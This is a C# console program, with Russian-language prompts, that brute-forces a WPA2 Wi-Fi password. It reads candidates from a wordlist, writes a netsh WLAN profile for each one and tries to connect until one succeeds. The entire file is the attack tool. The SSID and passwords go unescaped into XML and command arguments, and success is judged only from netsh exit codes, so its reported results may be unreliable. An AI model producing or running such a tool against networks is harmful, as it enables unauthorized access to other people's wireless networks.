using System.Diagnostics;
using System.Text;

namespace BruteForce_Method
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.OutputEncoding = Encoding.UTF8;
            Console.InputEncoding = Encoding.UTF8;

            Console.Write("Введите SSID (имя Wi-Fi сети): ");
            string ssid = Console.ReadLine();

            Console.WriteLine("1. Ввести пароль.\n" +
                              "2. BruteForce метод.");

            var answer = Console.ReadLine();

            if (answer is "1")
            {
                Console.Write("Введите пароль: ");
                string password = Console.ReadLine();

                try
                {
                    if(ConnectToWiFi(ssid, password))
                    {
                        Console.WriteLine("Подключение выполнено успешно!");
                    }
                    else
                    {
                        Console.WriteLine($"Ошибка при подключении с паролем {password}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Ошибка: {ex.Message}");
                }
            }
            else if (answer is "2")
            {
                Console.Write("Введите путь к текстовому файлу с паролями: ");
                string passwordFilePath = Console.ReadLine();

                if (!File.Exists(passwordFilePath))
                {
                    Console.WriteLine("Файл не найден. Проверьте путь.");
                    return;
                }

                try
                {
                    TestPasswords(ssid, passwordFilePath);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Ошибка: {ex.Message}");
                }
            }
        }

        static void TestPasswords(string ssid, string passwordFilePath)
        {
            string[] passwords = File.ReadAllLines(passwordFilePath); // Чтение всех паролей из файла

            foreach (string password in passwords)
            {
                Console.WriteLine($"Пробую подключиться с паролем: {password}");
                try
                {
                    if (ConnectToWiFi(ssid, password))
                    {
                        Console.WriteLine($"Успешное подключение! Пароль: {password}");
                        return; // Завершение после успешного подключения
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Ошибка при подключении с паролем {password}: {ex.Message}");
                }
            }

            Console.WriteLine("Все пароли из файла проверены. Подключение не удалось.");
        }

        static bool ConnectToWiFi(string ssid, string password)
        {
            // Генерация XML-профиля Wi-Fi
            string profileXml = $@"<?xml version=""1.0""?>
                                   <WLANProfile xmlns=""http://www.microsoft.com/networking/WLAN/profile/v1"">
                                       <name>{ssid}</name>
                                       <SSIDConfig>
                                           <SSID>
                                               <name>{ssid}</name>
                                           </SSID>
                                           <nonBroadcast>false</nonBroadcast>
                                       </SSIDConfig>
                                       <connectionType>ESS</connectionType>
                                       <connectionMode>auto</connectionMode>
                                       <MSM>
                                           <security>
                                               <authEncryption>
                                                   <authentication>WPA2PSK</authentication>
                                                   <encryption>AES</encryption>
                                                   <useOneX>false</useOneX>
                                               </authEncryption>
                                               <sharedKey>
                                                   <keyType>passPhrase</keyType>
                                                   <protected>false</protected>
                                                   <keyMaterial>{password}</keyMaterial>
                                               </sharedKey>
                                           </security>
                                       </MSM>
                                       <MacRandomization xmlns=""http://www.microsoft.com/networking/WLAN/profile/v3"">
                                           <enableRandomization>false</enableRandomization>
                                       </MacRandomization>
                                   </WLANProfile>";

            // Сохранение профиля во временный файл
            string tempFilePath = Path.Combine(Path.GetTempPath(), "WiFiProfile.xml");
            File.WriteAllText(tempFilePath, profileXml);

            // Выполнение команды netsh для добавления и подключения профиля
            ProcessStartInfo processInfo = new ProcessStartInfo
            {
                FileName = "netsh",
                Arguments = $"wlan add profile filename=\"{tempFilePath}\" user=all",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(processInfo))
            {
                process.WaitForExit();
                if (process.ExitCode != 0)
                {
                    return false;
                }
            }

            // Подключение к сети
            processInfo.Arguments = $"wlan connect name=\"{ssid}\"";
            using (Process process = Process.Start(processInfo))
            {
                process.WaitForExit();
                return process.ExitCode == 0;
            }
        }
    }
}
